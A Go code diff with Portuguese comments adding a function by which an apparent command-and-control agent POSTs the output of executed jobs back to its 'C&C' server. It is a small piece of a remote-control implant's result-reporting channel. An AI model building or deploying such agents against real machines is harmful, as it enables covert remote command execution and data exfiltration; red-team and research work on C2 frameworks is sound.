@@ -117,3 +117,40 @@ func (a *AgentHTTP) ExecuteJob(job Job) (string, error) {
 	// 3. Devolvemos a string limpa do terminal para ser enviada de volta ao C&C
 	return string(output), nil
 }
+
+func (a *AgentHTTP) SendJobResult(jobID string, output string) error {
+	// 1. Monta a URL da rota de resultados do Operador
+	url := a.serverURL + "/api/jobs/result"
+
+	// 2. Prepara o DTO (JSON) exatamente como o Servidor espera receber
+	payload := map[string]string{
+		"job_id": jobID,
+		"output": output,
+	}
+	
+	jsonData, err := json.Marshal(payload)
+	if err != nil {
+		return err
+	}
+
+	// 3. Prepara a requisição POST com o JSON embutido
+	req, err := http.NewRequest(http.MethodPost, url, bytes.NewBuffer(jsonData))
+	if err != nil {
+		return err
+	}
+	req.Header.Set("Content-Type", "application/json")
+
+	// 4. O Agente dispara a requisição para o C&C relatando o sucesso
+	resp, err := a.httpClient.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+
+	// 5. Valida se o servidor processou e aceitou o relatório
+	if resp.StatusCode != http.StatusOK {
+		return errors.New("falha ao enviar resultado para o C&C, status: " + resp.Status)
+	}
+
+	return nil
+}
